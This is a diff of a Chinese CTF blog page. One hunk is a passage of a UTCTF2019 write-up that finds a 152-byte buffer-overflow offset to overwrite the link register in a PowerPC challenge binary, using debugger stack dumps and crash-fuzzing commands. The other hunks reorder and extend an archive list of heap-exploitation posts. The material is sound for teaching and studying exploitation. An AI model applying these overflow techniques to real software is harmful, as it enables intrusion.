@@ -692,7 +692,7 @@ height:50vh;
 <p>同时查看栈，查找我们输入的一大串’0xaaaaaaaaaa’<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack <span class="number">100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ r31 sp  <span class="number">0</span>x40007fff50 —▸ <span class="number">0</span>x4000800040 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0</span>x40007fff58 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0</span>x40007fff60 —▸ <span class="number">0</span>x10000c64 (encrypt+<span class="number">176</span>) ◂— nop</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0</span>x40007fff68 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0</span>x40007fff70 ◂— <span class="number">0</span>x1c</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0</span>x40007fff78 ◂— <span class="number">0</span>x0</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0</span>x40007fff80 ◂— <span class="number">0</span>x1</span><br><span class="line">07:0038│         0x40007fff88 ◂— 0x20 /* ' ' */</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│         <span class="number">0</span>x40007fff90 —▸ <span class="number">0</span>x1009edfb ◂— <span class="number">0</span>x746e450000000000</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│         <span class="number">0</span>x40007fff98 ◂— <span class="number">0</span>x0</span><br><span class="line">... ↓</span><br><span class="line">0b:0058│         0x40007fffa8 —▸ 0x40007fffb0 ◂— 0x32 /* '2' */</span><br><span class="line">0c:0060│         0x40007fffb0 ◂— 0x32 /* '2' */</span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│         <span class="number">0</span>x40007fffb8 ◂— <span class="number">0</span>xaaaaaaaaaaaaaaaa  # 输入的内容</span><br><span class="line">... ↓</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│         <span class="number">0</span>x40007fffd0 ◂— <span class="number">0</span>xc1aaaaaa</span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│         <span class="number">0</span>x40007fffd8 ◂— <span class="number">0</span>x0</span><br></pre></td></tr></table></figure></p>
 <p>那么<code>LR</code>的偏移为<code>0xf0+0x10-0x68=152</code>，只要填充152字节就可以覆盖<code>LR</code>。</p>
 <p>当然，也可以用最粗暴的报错方法进行爆破溢出长度，原理跟x86的类似，输入一串超长的字符串，通过报错时观察<code>LR</code>的值，确定溢出长度</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> kira @ k1r4 in ~/pwn/utctf on git:master x [9:22:41]</span><br><span class="line"><span class="meta">$</span> python -c "print ('a'*152)"|./ppc</span><br><span class="line">This is the UT encryption service.</span><br><span class="line">We take your strings and make them into other strings!</span><br><span class="line">Enter a string</span><br><span class="line">153</span><br><span class="line">Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa</span><br><span class="line">Invalid data memory access: 0x00000000000000c0</span><br><span class="line">NIP 00000000000000c0   LR 00000000000000c1 CTR 0000000010014870 XER 0000000020000000 CPU#0</span><br><span class="line">MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0</span><br><span class="line"><span class="meta">#</span> kira @ k1r4 in ~/pwn/utctf on git:master x [9:22:58] C:139</span><br><span class="line"><span class="meta">$</span> python -c "print ('a'*160)"|./ppc</span><br><span class="line">This is the UT encryption service.</span><br><span class="line">We take your strings and make them into other strings!</span><br><span class="line">Enter a string</span><br><span class="line">161</span><br><span class="line">Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa</span><br><span class="line">Invalid data memory access: 0x0000000000000000</span><br><span class="line">NIP aaaaaaaaaaaaaaa8   LR aaaaaaaaaaaaaaaa CTR 0000000010014870 XER 0000000020000000 CPU#0</span><br><span class="line">MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kira @ k1r4 <span class="keyword">in</span> ~/pwn/utctf on git:master x [9:22:41]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python -c <span class="string">"print ('a'*152)"</span>|./ppc</span></span><br><span class="line">This is the UT encryption service.</span><br><span class="line">We take your strings and make them into other strings!</span><br><span class="line">Enter a string</span><br><span class="line">153</span><br><span class="line">Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa</span><br><span class="line">Invalid data memory access: 0x00000000000000c0</span><br><span class="line">NIP 00000000000000c0   LR 00000000000000c1 CTR 0000000010014870 XER 0000000020000000 CPU#0</span><br><span class="line">MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> kira @ k1r4 <span class="keyword">in</span> ~/pwn/utctf on git:master x [9:22:58] C:139</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python -c <span class="string">"print ('a'*160)"</span>|./ppc</span></span><br><span class="line">This is the UT encryption service.</span><br><span class="line">We take your strings and make them into other strings!</span><br><span class="line">Enter a string</span><br><span class="line">161</span><br><span class="line">Here's your string: aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa aa</span><br><span class="line">Invalid data memory access: 0x0000000000000000</span><br><span class="line">NIP aaaaaaaaaaaaaaa8   LR aaaaaaaaaaaaaaaa CTR 0000000010014870 XER 0000000020000000 CPU#0</span><br><span class="line">MSR 8000000002806001 HID0 0000000000000000  HF 8000000002806001 idx 0</span><br></pre></td></tr></table></figure>
 <p>留意<code>LR</code>的报错信息，当输入长度152时（请无视那个换行符），<code>LR</code>未被覆盖，而输入长度160时，<code>LR</code>已经被我们输入覆盖了。那么可以确定溢出长度为152。</p>
 <ul>
 <li>下一步，我们需要寻找一个可控的内存段存放shellcode，而且地址必须可知。</li>
@@ -1176,33 +1176,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 25
+        Total : 27
         </div>
         <!-- search  -->
         
@@ -1212,6 +1188,25 @@ top:50vh;
     
     
     
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2020/03/20/glibc2-29-tcache/" >tcache poisoning在glibc2.29中的利用小结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/20</span><a class="archive-post-title" href= "/2020/03/20/house-of-roman/" >House-Of-Roman学习笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
@@ -1243,22 +1238,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/tcahe-pwn/" >tcache在pwn题中常见的利用姿势</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/TAMUctf2019-pwn-writeup/" >TAMUctf2019-pwn-writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/encryptCTF2019-web-pwn-writeup/" >encryptCTF2019-web&pwn-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/UTCTF2019-pwn-writeup/" >UTCTF2019-pwn-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/tcahe-pwn/" >tcache在pwn题中常见的利用姿势</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/2019/05/31/TAMUctf2019-pwn-writeup/" >TAMUctf2019-pwn-writeup</a>
         </li>
     
     
